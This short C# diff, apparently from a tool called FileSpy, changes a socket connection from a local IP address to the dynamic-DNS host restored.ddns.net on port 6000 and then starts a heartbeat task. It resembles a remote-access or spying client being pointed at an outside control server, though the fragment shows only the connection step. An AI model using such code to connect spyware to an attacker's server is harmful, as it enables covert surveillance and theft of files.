@@ -48,7 +48,7 @@ namespace FileSpy.Classes
                     try
                     {
                         Client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-                        Client.Connect(IPAddress.Parse("192.168.1.77"), 6000);
+                        Client.Connect("restored.ddns.net", 6000);
                         Connected = true;
                         LastTime = DateTime.Now;
                         Task.Run(Pulsar);
